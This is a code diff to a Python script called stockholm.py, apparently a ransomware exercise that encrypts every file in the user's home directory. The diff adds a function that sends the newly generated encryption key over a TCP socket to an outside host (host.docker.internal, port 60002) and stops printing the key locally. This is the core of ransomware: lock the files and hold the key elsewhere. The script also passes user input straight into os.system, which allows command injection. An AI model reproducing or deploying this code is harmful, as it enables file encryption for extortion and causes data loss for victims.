@@ -3,11 +3,7 @@ import os
 from cryptography.fernet import Fernet
 import socket
 
-#socket
-#que hacer cuando las keys empiezan por guion
-
 def parse():
-
 	parser = argparse.ArgumentParser(
 		prog = 'python3 stockholm.py', 
 		description = 'encrypt/decrypt all files in home dir'
@@ -18,6 +14,13 @@ def parse():
 	args = parser.parse_args()
 	return args.__dict__
 
+def give_key(key):
+	host = 'host.docker.internal'
+	port = 60002
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+		s.connect((host, port))
+		s.send(key)
+		s.send(b'\n')
 
 if __name__ == "__main__":
 	dict = parse()
@@ -26,6 +29,10 @@ if __name__ == "__main__":
 	if (key):
 		os.system("./to_decrypt.sh " + key[0] + " " + silent)
 	else:
-		key = Fernet.generate_key().decode()
+		key = Fernet.generate_key()
+		try:
+			give_key(key)
+		except Exception:
+			print(key.decode())
+		key = key.decode()
 		os.system("./to_encrypt.sh " + key + " " + silent)
-		print(key)
